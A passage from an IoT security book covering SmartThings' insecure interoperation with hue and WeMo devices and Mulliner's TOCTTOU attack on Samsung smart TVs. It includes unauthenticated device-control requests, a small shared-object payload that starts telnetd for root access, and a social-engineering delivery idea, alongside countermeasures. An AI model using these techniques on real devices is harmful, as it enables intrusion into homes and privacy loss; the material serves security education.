From now on, the SmartThings hub can command the Philips hue bridge by always
including the value of 8f7ab27c-6c04-4378-b0b1-dcd4fd468815-0 as the authoriza‐
tion token in request. For example, it can issue a POST request of the form /api/
8f7ab27c-6c04-4378-b0b1-dcd4fd468815-0/groups/0/action with to turn of all the
lights, as shown in “Controlling Lights Using the iOS App” on page 18.
The hue bridge accepts incoming connections on port 80, which does
not use encryption. This can allow a malicious device on the local
network to launch ARP spoofing attacks and steal and proxy the
username. However, this architecture is based on design from the hue
team. The SmartThings hub has no choice but to use unencrypted
communication, because the kue web server communicates only in
clear text.
Recall from Chapter 1 that the earlier implementation of the hue App utilized the MD5
hash of the smartphone’s MAC address as the username. We know that was a bad idea,
because it allowed any local device to cause a perpetual blackout. The SmartThings hub
does not commit this error. The SmartThings team should be complimented for de‐
signing this diligently.
SmartThings and the WeMo Switch
The WeMo Switch (“Some Things Never Change: The WeMo Switch” on page 90) can
also be controlled using the SmartThings app. Similar to setting up the hue, the user has
to select the + button on the bottom of the Dashboard screen of the app, followed by
selecting Switches & Dimmers → Belkin WeMo Switch → Connect Now. This causes
the SmartThings hub to search for the switch using SSDP:
M-SEARCH * HTTP/1.1
MX: 1
MAN: "ssdp:discover"
HOST:239.255.255.250:1900
ST: urn:Belkin:device:controllee:1
The WeMo Switch responds to identify itself:
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=86400
DATE: Mon, 20 Oct 2014 14:32:17 GMT
EXT:
LOCATION: http://192.168.2.10:49153/setup.xml
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
SERVER: Unspecified, UPnP/1.0, Unspecified
X-User-Agent: redsonic
ST: urn:Belkin:device:controllee:1
The app alerts the user that a WeMo Switch has been located, as shown in Figure 4-18.
Interoperability with Insecurity Leads to … Insecurity 
| 
135

136 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-18. SmartThings app letting the user know that a WeMo Switch has been
Interoperability with Insecurity Leads to … Insecurity 
| 
137

found
As expected, the SmartThings hub sends the following GET request to the WeMo Switch:
GET /setup.xml HTTP/1.1
HOST: C0A8020A:C001
And the Switch responds:
HTTP/1.1 200 OK
CONTENT-LENGTH: 3767
CONTENT-TYPE: text/xml
DATE: Mon, 20 Oct 2014 14:32:23 GMT
LAST-MODIFIED: Mon, 20 Oct 2014 14:26:28 GMT
SERVER: Unspecified, UPnP/1.0, Unspecified
X-User-Agent: redsonic
CONNECTION: close
<?xml version="1.0"?>
<root xmlns="urn:Belkin:device-1-0">
  <specVersion>
    <major>1</major>
    <minor>0</minor>
  </specVersion>
  <device>
<deviceType>urn:Belkin:device:controllee:1</deviceType>
<friendlyName>WeMo Switch</friendlyName>
    <manufacturer>Belkin International Inc.</manufacturer>
    <manufacturerURL>http://www.belkin.com</manufacturerURL>
    <modelDescription>Belkin Plugin Socket 1.0</modelDescription>
    <modelName>Socket</modelName>
    <modelNumber>1.0</modelNumber>
    <modelURL>http://www.belkin.com/plugin/</modelURL>
<serialNumber>[DELETED]</serialNumber>
<UDN>[DELETED]</UDN>
    <UPC>123456789</UPC>
<macAddress>[DELETED]</macAddress>
<firmwareVersion>WeMo_US_2.00.2769.PVT</firmwareVersion>
<iconVersion>0|49153</iconVersion>
<binaryState>0</binaryState>
    <iconList>
      <icon>
        <mimetype>jpg</mimetype>
        <width>100</width>
        <height>100</height>
        <depth>100</depth>
         <url>icon.jpg</url>
      </icon>
    </iconList>
    <serviceList>
      <service>
        <serviceType>urn:Belkin:service:WiFiSetup:1</serviceType>
        <serviceId>urn:Belkin:serviceId:WiFiSetup1</serviceId>
138 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

        <controlURL>/upnp/control/WiFiSetup1</controlURL>
        <eventSubURL>/upnp/event/WiFiSetup1</eventSubURL>
        <SCPDURL>/setupservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:timesync:1</serviceType>
        <serviceId>urn:Belkin:serviceId:timesync1</serviceId>
        <controlURL>/upnp/control/timesync1</controlURL>
        <eventSubURL>/upnp/event/timesync1</eventSubURL>
        <SCPDURL>/timesyncservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:basicevent:1</serviceType>
        <serviceId>urn:Belkin:serviceId:basicevent1</serviceId>
        <controlURL>/upnp/control/basicevent1</controlURL>
        <eventSubURL>/upnp/event/basicevent1</eventSubURL>
        <SCPDURL>/eventservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:firmwareupdate:1</serviceType>
        <serviceId>urn:Belkin:serviceId:firmwareupdate1</serviceId>
        <controlURL>/upnp/control/firmwareupdate1</controlURL>
        <eventSubURL>/upnp/event/firmwareupdate1</eventSubURL>
        <SCPDURL>/firmwareupdate.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:rules:1</serviceType>
        <serviceId>urn:Belkin:serviceId:rules1</serviceId>
        <controlURL>/upnp/control/rules1</controlURL>
        <eventSubURL>/upnp/event/rules1</eventSubURL>
        <SCPDURL>/rulesservice.xml</SCPDURL>
      </service>
.
      <service>
        <serviceType>urn:Belkin:service:metainfo:1</serviceType>
        <serviceId>urn:Belkin:serviceId:metainfo1</serviceId>
        <controlURL>/upnp/control/metainfo1</controlURL>
        <eventSubURL>/upnp/event/metainfo1</eventSubURL>
        <SCPDURL>/metainfoservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:remoteaccess:1</serviceType>
        <serviceId>urn:Belkin:serviceId:remoteaccess1</serviceId>
        <controlURL>/upnp/control/remoteaccess1</controlURL>
        <eventSubURL>/upnp/event/remoteaccess1</eventSubURL>
        <SCPDURL>/remoteaccess.xml</SCPDURL>
      </service>
.
      <service>
        <serviceType>urn:Belkin:service:deviceinfo:1</serviceType>
        <serviceId>urn:Belkin:serviceId:deviceinfo1</serviceId>
Interoperability with Insecurity Leads to … Insecurity 
| 
139

        <controlURL>/upnp/control/deviceinfo1</controlURL>
        <eventSubURL>/upnp/event/deviceinfo1</eventSubURL>
        <SCPDURL>/deviceinfoservice.xml</SCPDURL>
      </service>
    </serviceList>
   <presentationURL>/pluginpres.html</presentationURL>
</device>
</root>
Seem familiar? It’s the exact same response as when the official WeMo App requests /
setup.xml (as shown in “Some Things Never Change: The WeMo Switch” on page
90>>). This seems logical and expected. The point of reiterating it here is to demonstrate
that the SmartThings app is following the same protocol as the WeMo app to intero‐
perate with the WeMo Switch, which is a third-party device.
The SmartThings app can be used to create custom triggers, as shown in Figure 4-19.
In this case, the lamp connected to the WeMo switch will turn on every time the door
to which a SmartThings Multi Sensor is attached is opened. The lamp will then turn off
after five minutes of no activity.
140 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-19. SmartThings app controllilng the WeMo Switch
Interoperability with Insecurity Leads to … Insecurity 
| 
141

Once set up, the SmartThings hub can connect directly to the switch and issue com‐
mands. For example, the hub can send the following request to the Switch:
POST /upnp/control/basicevent1 HTTP/1.1
SOAPACTION: "urn:Belkin:service:basicevent:1#GetBinaryState"
Content-Length: 277
Content-Type: text/xml; charset="utf-8"
HOST: 192.168.2.10:49153
User-Agent: CyberGarage-HTTP/1.0
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:GetBinaryState xmlns:u="urn:Belkin:service:basicevent:1">
</u:GetBinaryState>
</s:Body>
</s:Envelope>
The GetBinaryState request’s intention is to query if the switch is on or off. The switch
responds:
HTTP/1.1 200 OK
CONTENT-LENGTH: 285
CONTENT-TYPE: text/xml; charset="utf-8"
DATE: Mon, 20 Oct 2014 16:33:36 GMT
EXT:
SERVER: Unspecified, UPnP/1.0, Unspecified
X-User-Agent: redsonic
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>
<u:GetBinaryStateResponse xmlns:u="urn:Belkin:service:basicevent:1">
<BinaryState>0</BinaryState>
</u:GetBinaryStateResponse>
</s:Body> </s:Envelope>
The value of 0 for BinaryState indicates that the switch is turned off. As shown in
Chapter 3, the hub can also send a SetBinaryState to toggle the power on.
Notice that, just like the official WeMo app, no authentication or authorization is re‐
quired. In order to interoperate with other devices such as the WeMo switch and hue
lighting, the SmartThings hub and app have no choice but to follow the protocol defined
by the third-party devices they integrate with. This is precisely the point of this section
and analysis: interoperability with third-party IoT devices that expose services inse‐
curely maintains the insecurity and risk that is exposed.
There is little SmartThings can do to secure the design crafted by third-party devices
they want to integrate with. The toss-up is between the decision of interoperability while
maintaining the insecurity or the decision not to integrate. It appears that SmartThings
has decided to go the route of interoperability, to be able to support a wide ecosystem
142 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

of IoT devices, including third parties, that can in turn be programmed using the
SmartThings app and their IDE. This approach makes sound business sense, because it
positions SmartThings to be the hub of IoT devices of the future. However, the risk that
is exposed is the sum total of the impact of all insecure devices that SmartThings decides
to interoperate with.
Conclusion
Companies like SmartThings are clearly enabling IoT in the home and helping us push
toward our digital futures that blur the lines between our physical spaces and our online
virtual spaces. The SmartThings IDE is a powerful way to elegantly program both the
spaces to maximize benefit from IoT devices in our homes.
The majority of popular use cases, such as an event triggered by the door opening, or a
motion sensor detecting activity in the middle of the night, are clearly aligned toward
protecting our safety. In cases in which our physical safety is the paramount issue of
concern, it becomes extremely important that the technology supporting and enabling
it be designed securely. In this chapter, we discussed why products like SmartThings
need to enable authentication that is beyond the traditional username and password
approach. We’ve learned the hard way why a mere password is not enough to protect
our online accounts, and we can’t risk the same with devices that are put in place to
ensure our physical safety.
A popular concern with IoT devices is the ability to issue security patches to fix known
security flaws. Security researchers have pointed out a major attack against the Smart‐
Things hub that can lead to a man-in-the-middle attack, which was duly patched by
SmartThings. This is a good example of IoT device manufacturers doing the right thing,
by communicating with security researchers and diligently issuing firmware updates to
their customers to remediate the issue.
We also studied how the powerful SmartThings developer IDE can be tied with tradi‐
tional technologies, such as text messaging, and how this can be abused to spoof mes‐
sages to users to scare them or to distract them. As we enable further IoT sensors in the
home, we ought to think through all the various avenues of notifications and commu‐
nications and have a strategy for gradually retiring traditional mechanisms such as text
messaging. Such an approach might have to be more gradual than we’d like, given spotty
data coverage in some areas. However, it is important that we begin to have the discus‐
sion now and educate users on the current shortcomings.
Unlike the Philips hue lighting system and the WeMo suite of products, the SmartThings
hub and devices do not connect directly. Instead, they connect outbound to an external
cloud infrastrucutre and exchange instructions. The SmartThings architecture is there‐
fore less likely to fall prey to another rogue device on the same local network, because
there is no implicit trust of local devices.
Conclusion 
| 
143

Given the frequency of successful phishing attempts and workstation compromise due
to malware, this is a welcome design decision, because it keeps the SmartThings devices
from falling prey to other infected machines on the same network. However, Smart‐
Things’ approach to this design does not stem from a conscious intent to be secure, but
it’s more of a side effect of going to market with dependability on the cloud as the first
step:
We made the decision at SmartThings to support a “Cloud First” approach for our plat‐
form. This means that in our initial release, there is a dependency on the Cloud. Smar‐
tApps run in the SmartThings Cloud, so for everything to work, your hub does need to
be online and connected to our cloud. This will generally be the case, even when we
implement hub-local capabilities as described below.
We believe in a “connected” service where local capabilities in the hub are meant to im‐
prove performance and insulate the customer from intermittent internet outages. We do
not plan to support a perpetually disconnected mode.
We made the decision to limit SmartApps to the Cloud in our first release because it
allowed us to focus on the experience of writing the applications and less on the mechanics
of deploying that logic locally to the hub.
That said, we are actively considering implementation scenarios whereby we can dis‐
tribute SmartApps to—and execute SmartApps locally on—the SmartThings Hub.
In all cases, we recognize the critical scenarios where a loss of communications with the
SmartThings Cloud could have a degrading impact on critical, local use cases, and are
being deeply thoughtful on how we minimize the risk of disruption.
We hope that SmartThings and other influential IoT device manufacturers design local
and disconnected capabilities securely. Their recognition of critical scenarios due to a
loss of communications is laudable and the right approach. However, we’ve seen in
previous chapters how reliance the local network as inherently secure can lead to a high
probability of disruption and compromise of our privacy and security. As we look into
the future, we ought to demand secure design as an intention, not a side effect. It would
be a shame if the architecture designed to support critical functionality in times of a
communication disruption is vulnerable to attacks when the communication channel
is available.
Companies like SmartThings are leading innovation that will help us enable IoT in our
homes. We are also going to increasingly depend upon these devices for our well-being
and for our safety. IoT device manufacturers and consumers ought to think more care‐
fully about secure authentication, trustworthiness of communications, and secure in‐
teroperability between devices.
144 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

CHAPTER 5
The Idiot Box: Attacking “Smart”
Televisions
The glass slabs are everywhere and they seem to want to obnoxiously and rudely isolate
society. We stare at our smartphone screens texting someone afar while neglecting the
warmth of an in-person conversation with friends that are next to us. The dopamine
hit from our phones buzzing in our pockets has become far too difficult to ignore. We
must know what fresh piece of notification is waiting for us. It doesn’t matter if the
notification is a result of someone we hardly know on Facebook merely liking an in‐
significant photograph posted on Facebook. Admittedly, first world societies have no‐
ticed how the glass slab display of the smartphone is making our interaction soulless
and less human. It is negatively influencing our behavior and respect of one another’s
presence and we are taking notice. It is increasingly becoming frowned upon to play
with our smartphones in meetings, on dates, and during important conversations. There
are areas of interaction that seem permanently obsolete, however. Look around the next
time you are in an elevator or a neighborhood bar and notice the amount of people with
their heads down staring at the glaring glass slab of their smartphones. The romanticism
of striking up a meaningful conversation with a stranger seems diminished.
The smartphone is only a recent example of how the glass display can influence society
and our interactions with one another. We will pick on the smartphone a little later, but
the award for the most influential and distracting display of all goes to the television. It
is the TV, nicknamed “the idiot box”, that has shaped the influence of technology on our
society for the last few decades. The disdain for the technology supporting the nickname
is quite evident. Try and start a conversation about a recent TV show at a cocktail party
and you will quickly run into someone in the group who will claim ignorance of the
topic because they are proud to not own a TV. Some of this disdain is with merit. There
are far too many instances of parents abusing TV to distract their children with content
that demotes their intellectual capacities. There is little argument against the hypothesis
that children who watch TV for hours can be robbed of valuable time that could be
145

spent towards furthering paternal and maternal bonds. We can also imagine how adults
that are glued to TV for hours, with no emphasis on curated content, are likely to learn
misinformation and dwell on superficial content targeted towards the entertainment of
the mass audience.
The television deserves as much praise as it deserves critique. Ask anyone alive in
America on July 1969 how profound of an event it was to watch the Apollo 11 mission
that landed the first human beings on to the moon. An estimated 600 million people
watched Neil Armstrong and Buzz Aldrin on the surface of the moon, demonstrating
the triumph of humankind’s success in harnessing technology. The coverage of the
moon landing in the United States and across the world bought societies together to
appreciate the spirit of collaboration and the humility from comprehending the vast
distances in space - our nearest neighbor, the moon, was no small feat to get to. Even
though the United States was responsible for the mission, the world watched in awe and
took credit for the entire human race.
The television has bought us live coverage of events that have forever changed our lives
and impacted our opinions. The heartache and soul crushing event of the September
11, 2001 terrorist attacks left a scar in the hearts of almost everyone who watched the
clip of the airplanes repeatedly smashing into the twin towers, followed by clips of
innocent victims jumping off the buildings, and the buildings collapsing much to the
horror of everyone.
Aside from popular entertainment, cultures around the planet depend on the Television
for information and entertainment that furthers their understanding of the world
around them. We get to hear different opinions, debates, and documentaries that are
truly educational.
No matter where you stand on the cumulative contribution of the television, we know
they aren’t going anywhere any time soon. Families around the world, in billions, own
TVs and watch the content broadcasted on them on a regular basis. In recent times,
we’ve seen TVs improve on obtaining greater resolution resulting in stunning picture
quality. HD Televisions are more the more common higher resolution TVs offering up
to 2,073,600 pixels per frame. The 4k standard is an upcoming successor which offers
4 times as much resolution (while 8k is rumored to offer resulutions up to 7,680x4,320
pixels which is 33.2 million pixels).
The new wave of “Smart” Televisions in the market today is focused on providing us
much more than improved resolutions. They are now connected to our WiFi networks
to serve us in ways we could never imagine a TV could or would. These TVs include
services such as watching streaming video, video conferencing, social networking, and
instant messaging. In the tune of the IoT landscape, this “thing” we’ve known as the
traditional TV, is morphing into a display that serves us in variety of additional methods
in addition to displaying regular content.
146 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

The Smart TV displays are becoming increasingly popular in households for the added
benefit they serve. The current generation of Smart TVs are expensive and available to
the affluent. However, given the general track record of how quickly technology be‐
comes cheaper, the feature sets of Smart TVs will be available to the mass in the coming
years. It is likely that the next incident contributing to global triumph or heartbreak will
be viewed by millions of individuals on their Smart televisions. Given that they plug
into our WiFi networks on which many other of our important computing and IoT
devices reside, it becomes important that we evaluate the secure design of these displays
that are in the market currently. In this chapter, we will take a look at actual research in
the area of attack vectors against Smart TVs to understand how we can improve them
and securely enable our IoT future that is likely to continue to include Smart TV displays
in one way or another.
The TOCTTOU Attack
Many of the popular Smart TVs, particularly from Samsung, run the Linux operating
system. They are essentially similar in design to desktop or laptop computers, the only
difference being is that their User Interface design is tailored towards displaying video
content from various sources. Using a powerful operating system like Linux also gives
Smart TVs the ability to run various applications such as Skype and the web browser.
We will discover details of the underlying architecture as we analyze some well-
publicized attacks against Smart TVs in this chapter. Let’s start with a basic attack vector
called Time-of-Check-to-Time-of-Use (TOCTTOU) publicized by researchers Collin
Mulliner and Benjamin Michéle.
The TOCTTOU attack targets one of the most basic security capabilities in consumer
electronics: the ability for the device to ensure that a software update is legitimate and
created by the manufacturer or a trusted third party. This is an important capability for
the manufacturer to protect their intellectual property and also to secure the device
against malicious software that may violate the integrity of the software or compromise
the privacy of the consumer. A good example is the jailbreak community surrounding
Apple’s iOS operating system, which powers the iPhone and the iPad. Apple continu‐
ously builds security mechanisms to prevent others from being able to modify the core
functionality of their devices to preserve their ownership of the experience of the prod‐
uct and to prevent malicious applications from infecting the device. The jailbreak com‐
munity on the other hand strives to find loopholes in Apple’s security mechanisms so
they can modify the functionality of the devices to install customized tweaks and soft‐
ware not authorized by Apple. In the case of Smart TVs, manufacturers want to protect
their devices from running unauthorized code to protect their intellectual property, to
avoid warranty issues from users uploading buggy code, and to protect digital content
such as online rental movies from being recorded. Smart TV users, on the other hand,
may want to break the security mechanisms enforced by manufacturers so they can
enable additional tweaks, fix software issues on devices that are no longer supported by
The TOCTTOU Attack 
| 
147

the manufacturer, and perhaps engage in theft by permanently recording rental based
media content.
The SamSung LExxB650 Series
Mulliner’s research focuses on SamSung LExxB650 series (Figure 5-1) of Smart TVs
even though the concept of the TOCTTOU attack vector can be applied to other con‐
sumer electronic devices that may be similarly vulnerable.
Figure 5-1. SamSung’s LExxB650 series Smart TV.
In the case of Smart TVs and other electronics, the USB port is often used to read and
write files that can comprise of media content, applications, and software updates. A
storage device, such as a USB memory stick, can be plugged in to the TV to watch content
stored on the memory stick, as well as install Smart TV Aps, and also to upgrade firm‐
ware.
Apps specifically written for the SamSung LExxB650 series of TVs can be of two types:
Adobe Flash and native binaries. Mulliner’s research targets the native binary approach.
These binaries end with the .so extension, which means that the binaries are able to
share code with other binaries and are loaded on runtime. The advantage of this is that
other modules can use code written using this approach and applications, which reduces
148 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

the size of executables and also allows developers to change shared code in one file and
not have to recompile other dependencies. The SamSung TVs use Linux so this approach
makes sense. In the world of Microsoft Windows, these files are known as Dynamic
Link Libraries (DLLs).
SamSung uses BusyBox, which combines tiny versions of many common Linux utilities
into a single executable. The BusyBox system is useful to power consumer devices be‐
cause it is an easy way to include or exclude commands making it extremely modular.
The SamSung TVs run a binary called exeDSP that basically controls the entire func‐
tionality of the system. It is responsible for the user interface navigation, allowing the
user to change settings, and for accessing the applications. The exeDSP binary runs as
the root user, i.e. with full privileges.
The Apps written for SamSung TVs contain a minimum of three files: The executable
code (Adobe flash or a shared object), a bitmap (the icon for the App), and the package
description in a file called clmeta.dat. Here is an example of a clmeta.dat file:
<?xml version="1.0" encoding="utf-8"?>
<contentlibrary>
  <contentpackid="tocttou">
    <category>Wellness</category>
    <title language_id="English">tocttou</title>
    <startpointlanguage_id="English">tocttou.so</startpoint>
    <thumbnailpath>tocttou.bmp</thumbnailpath>
    <totalsize>1</totalsize>
  </contentpack>
</contentlibrary>
The startpoint tag specifies the actual binary, which in this case is tocttou.so. The
category tag specifies the type of App, which in this case is “Wellness”. Other common
categories recognized by SamSung are “Game” and “Children”. Mulliner noted that ap‐
plications of type “Game” are in the form of shared objects while other categories imply
Adobe Flash applications.
In the case of shared objects, the Game_Main function call is invoked by the exeDSP
executable, which is coded using the C programming language. The following is a simple
shared object code:
int Game_Main(char *path, char *udn)
{
    system("telnetd &");
    return 0;
}
In this case, the application starts up the Telnet service (assuming it is installed on the
system). However, the LExxB650 series of SamSung TVs do not allow the installation
of additional applications that are shared libraries. This severely limits the ability of a
third party to modify the functionality of the TV. This also limits the ability of a third
The TOCTTOU Attack 
| 
149

party to install malicious code that could infect the TV to let the attacker invade privacy
by viewing video from a camera attached to the TV and stealing any credentials that
may be stored on the TV. The goal of Mulliner’s research was to test and demonstrate
if there is a way to override this limitation.
The Exploit
Recall that the exeDSP executable runs with root privileges. The exeDSP process is also
responsible for starting up applications that are shared libraries. Since exeDSP does not
lower the privileges of shared libraries that it executes, the ability to install additional
third-party applications is immensely attractive to an attacker as well as to someone
who wants to extend or modify the functionality of their TV. Therefore, the goal of the
attack is to somehow get the TV to allow installation of an external application that is
of category “Game” which corresponds to shared library code.
Mulliner used a Gumstix expansion board to setup the attack. The Gumstix board is
equipped with an USB OTG port which allows other USB devices to connect to it as
clients (for example USB memory sticks and digital cameras). USB OTG also allows the
Gumstix board to function as a client, i.e. connect into other USB hosts as a storage
device (such as a USB memory stick).
The Gumstix board is basically a mini computer. These instructions
on how to connect to a new Gumstix board are useful in understand‐
ing the functionality and capability of the board.
The g_file_storage.ko module is part of the Linux USB stack. By using this module
and presenting the Gumstix board as a USB storage device, it is possible to analyze what
files the TV reads when presented with an application. In the case of the SamSung TV,
non-shared library applications, i.e. Adobe Flash applications, are copied from the USB
device to the TV’s internal storage and executed. Each application should be in it’s own
directory, include a bitmap file, the clemeta.dat file, and the actual binary as listed in
the startpoint tag in clmeta.dat.
The g_file_storage.ko utility takes the filename of a file system image as a parameter
and exports it as a USB device. When connected to a host, each block request is read
and sent over. Mulliner modified the utility to also track every block read request in
order to ascertain exactly what information the TV is reading when presented with a
new application. The following is a sample output from the modified version of
g_file_storage.ko when the TV is presented with a Adobe Flash application:
11:18:56 TOCTTOU        (DIR)
11:18:56 CLMETA.DAT     (471b) [/TOCTTOU]
11:18:56 CLMETA.DAT     -> read completed!
150 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

11:18:56 CACHE          (DIR)
11:18:56 CLMETA.DAT     (450b) [/CACHE]
11:18:56 CLMETA.DAT     -> read completed!
11:19:10 CACHE.BMP      (843758b) [/CACHE]
11:19:10 CACHE.BMP      -> read completed!
11:19:10 TOCTTOU.BMP    (490734b) [/TOCTTOU]
11:19:10 TOCTTOU.BMP    -> read completed!
11:19:56 TELNETD        (1745016b) [/TOCTTOU]
11:19:56 TELNETD        -> read completed!
11:19:56 TOCTTOU.SO     (4608b) [/TOCTTOU]
11:19:56 TOCTTOU.SO     -> read completed!
In this case, the g_file_storage.ko module running on the Gumstix that is plugged
into the SamSung TV included two applications in directories of their own: TOCTTOU
and CACHE. For each application, the TV requested the CLMETA.DAT file (at the 11:18:56
mark). The user is then presented with the category of applications that are available to
be installed. Let’s assume the TOCTTOU application is of type “Wellness” and the user
selects this using the TV remote. At this time, the entire contents of the TOCCTOU direc‐
tory is copied to the TV’s internal storage, including the bitmap image, the telnetd
binary executable, and the TOCTTOU.SO executable. Note that applications of the category
“Games” will not be installed by the TV since externally coded shared library code is
prohibited.
Notice that the clmeta.dat file is only read once (11:18:56). When the user installs the
TOCTTOU application, the TV does not re-read the clmeta.dat file. This is because the
TV runs Linux which includes the functionality of a “block cache”. Because file read
operations can slow things down, the “block cache” functionality speeds things up by
storing recently accessed file operations into the TVs RAM, which is faster to read than
a file system.
The idea behind the TOCTTOU attack is to initially provide the TV with an application
directory in which the corresponding clmeta.dat is of category is “Wellness”. Once the
TV verifies this, the user is able to select the application and the TV will copy the entire
contents of application directory into it’s local storage and execute it. The TOCTTOU
attack replaces the clmeta.dat category to “Games” after the initial verification allowing
for shared library code to be installed. In order to do this, Mulliner further extended
the functionality of g_file_storage.ko to be able to track how many times a file (“trig‐
ger file”) has been requested for read. Furthermore, g_file_storage.ko was extended
to switch to another image once read count for the “trigger file” reaches a certain value
(i.e. “trigger count”).
Mulliner created two file systems images for the attack. The first image, called “B” (for
“Benign”) includes two applications, TOCTTOU and Cache. Each of these applications
contain a clmeta.dat file listed in the category of “Wellness” and corresponding files
for icons and executables. The TOCTTOU application includes the telnetd executable.
The second image, called “M” (supposedly to imply “Modified”), includes the exact same
The TOCTTOU Attack 
| 
151

files except for the clmeta.dat file in the TOCCTOU directory that was modified to the
category of “Games”.
Mulliner then used his modified g_file_storage.ko code to attach to the TV as a USB
stick and serve the “B” image. When the TV reads the clmeta.dat file in the directory
of the “Cache” application, g_file_storage.ko switches to the “M” image in the back‐
ground. When the user elects to install the TOCTTOU application, the application code
is served from the value of the “trigger count” parameter for the trigger file (Cache/
clmeta.dat) to 1. In this situation, when the user elects to install the TOCCTOU applica‐
tion, the files from image “M” are served to the TV. However, the problem is that even
though the malicious image “M” contains the clmeta.dat file with category “Games”,
it is not re-read by the TV upon installation because it is in the TV’s memory because
of it’s block caching functionality. Mulliner got around this by making the size of the
clemeta.dat file in the “Cache” application greater than 260 Megabytes (by padding it
with extra spaces). This exhausts the RAM allocated to block caches and makes the TV
re-read clmeta.dat, which is of category “Games”.
Mulliner’s attack succeeds because the TV only checks the category of the clmeta.dat
file initially and not when it is re-read (therefore the name: “Time-of-Check-to-Time-
of-Use”). Here is the output of g_file_storage as this attack is played out:
1 TOCTTOU           (DIR)
2 CLMETA.DAT        (471b) [/TOCTTOU]
3 CLMETA.DAT        -> read completed!
4 CACHE             (DIR)
5 CLMETA.DAT        (272630223b) [/CACHE]
6 CLMETA.DAT        -> read completed!    [device switched!]
7 CACHE.BMP         (843758b) [/CACHE]
8 CACHE.BMP         -> read completed!
9 TOCTTOU           (DIR)
10 TOCTTOU.BMP      (490734b) [/TOCTTOU]
11 TOCTTOU.BMP      -> read completed!
12 TELNETD          (1745016b) [/TOCTTOU]
13 TELNETD          -> read completed!
14 TOCTTOU.SO       (4608b) [/TOCTTOU]
15 TOCTTOU.SO       -> read completed!
16 CLMETA.DAT       (471b) [/TOCTTOU]
17 CLMETA.DAT       -> read completed!
When the Gumstix board is first plugged into the TV, g_file_storage.ko serves up
files from image “B”. The TV reads the clmeta.dat file and makes sure they are not
categorized as “Games”. Notice that the clmedta.dat file is about 270 megabytes, which
fills up the cache memory allocation in the TV. This will make the TV re-read previously
cached files from the Gumstix board again. At this point, the g_file_storage.ko utility
switches to image “M” (signified by “device switched” in line 6). The TV is satisfied that
none of the applications are of type “Games” and allows the user to pick an application
to install. The user selects the TOCTTOU application and the TV copies all files in the
152 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

TOCTTOU directory to it’s local storage, including an additional binary for the telnet
service (telnetd).
Notice that the TV re-reads the clmeta.dat file in step 16, which is served from image
“M” and is categorized as “Games”. Since the TV doesn’t double check the categorization
upon re-reading the file, the application is copied onto local storage and executed by
exeDSP with root privileges. In this way, Mulliner was able to trick the TV into running
a shared library application with the highest privileges. In this case, Mulliner used the
Game_Main function in tocttou.so to invoke the telnetd binary. Assuming this binary
is modified not to ask for a password, the attacker can use this method to login into the
TV (using a telnet client) with no password and directly obtain a root shell.
This is a great example of how a simple attack can be used to bypass restrictions and
security functionality designed into popular Smart TVs. Even though this attack re‐
quires physical access to the TV, it is still interesting because it exploits a simple vul‐
nerability, i.e. the TV doesn’t check the categorization of the application when re-reading
the clmeta.dat file.
We shouldn’t discount the probability of attack because it requires physical access. A
specific family can indeed be targeted via a social engineering attack. This could take
the form of a modified board (such as the Gumstix) being physically mailed to the family
in the guise of an official update from “Samsung”. Many Smart TVs include video cam‐
eras for conference calling or allow third party cameras to be plugged in. A target family
that can be socially engineered to plug in a malicious device into the USB port can
therefore quickly have their privacy taken away from them in addition to their Smart
TV being abused to launch further attacks into their home network and neighboring
IoT devices by including specifically designed malware and remote login functionality
to enable the attacker.
The countermeasure for this attack is quite simple. The TV (and other IoT devices that
want to restrict third party applications) should first copy the application onto local
storage and then check the categorization. If the categorization fails, the TV should
discard and reject the application. This is also true for other categories of IoT devices
that allow users to only install certain types of applications. This will help ensure that
the IoT devices users depend on for their privacy are safe and not vulnerable to simple
attacks like TOCTTOU.
You call that Encryption?
The field of cryptography is alive and thriving. Advances in encryption algorithms and
computational power is helping to protect our data and the integrity of software and
hardware. IoT devices are and will continue to be dependent on encryption to make
sure the privacy of the user is protected and the integrity of the device is not compro‐
mised. Encryption algorithms are great tools to leverage to promote secure design, but
You call that Encryption? 
| 
153

ultimately, the architects and developers must have a proper understanding of how the
algorithms work to be able to design them securely. Lack of comprehension of the fun‐
damentals of encryption algorithms can and will make the end product vulnerable to
flaws and attacks.
In this section, we will take a look at how the lack of understanding of basic encryption
algorithms led a SamSung Smart TV to become vulnerable to a local (physical access
required) attack which allowed the user to modify the TV’s firmware. This is a similar
outcome to the TOCTTOU scenario, but the attack vector exploits an implementation
flaw that uses XOR encryption. We will quickly recap the XOR algorithm and analyze
how the attack works.
Understanding XOR
XOR is a boolean algebra function which stands for “eXclusive OR”. Quite simply, it will
return true if one, and only one, of the two operators is true. With this logic, the following
table holds true:
1 XOR 1 is 0
1 XOR 0 is 1
0 XOR 1 is 1
0 XOR 0 is 0
Let us write a simple C program to XOR a string cat with the key KEY.
#include <stdio.h>
int main()
{
  char string[4]="cat";
  char key[4]="KEY";
  for(int x=0; x<3; x++)
  {
    string[x]=string[x]^key[x];
    printf("%c",string[x]);
  }
  printf("\n");
  return 1;
}
Note that ^ represents an XOR operation in the C programming language.
Now let’s compile it:
$ gcc xor.c -o xor
And run it to see the output:
154 
| 
